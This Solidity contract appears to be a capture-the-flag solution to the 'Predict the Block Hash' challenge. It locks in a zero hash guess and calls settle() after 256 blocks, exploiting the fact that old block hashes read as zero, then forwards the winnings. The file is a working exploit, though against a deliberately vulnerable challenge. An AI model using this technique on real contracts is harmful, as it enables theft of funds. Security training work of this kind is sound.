pragma solidity 0.8.7;

interface IPredictTheBlockHashChallenge {
    function isComplete() external view returns (bool);
    function lockInGuess(bytes32 hash) external payable;
    function settle() external;
}

/**
 * TO PASS THIS CHALLENGE : WAIT until pass 256 block exclude current block after caliing lockInGuess() ||  Mine 256 block by hardhat / tuffle the call attack()
 * https://ropsten.etherscan.io/ : to see a latest block number.
 */
contract PredictTheBlockHashChallengeHack {
    IPredictTheBlockHashChallenge public ptfInstance;
    uint256 public startBlock;
    uint256 public amountBlock;
    address public guesser;

    constructor(IPredictTheBlockHashChallenge _ptfInstance) {
        ptfInstance = _ptfInstance;
        startBlock = block.number;
    }

    function destroy() public payable{
        payable(tx.origin).transfer(address(this).balance);
    }

    function mineBlock() public {
        amountBlock = block.number-startBlock;
    }

    function calllockInGuess() public payable {
        ptfInstance.lockInGuess{value: msg.value}(0x0000000000000000000000000000000000000000000000000000000000000000);
    }

    function attack() public payable {
        ptfInstance.settle();
    }

    receive() external payable {}
}
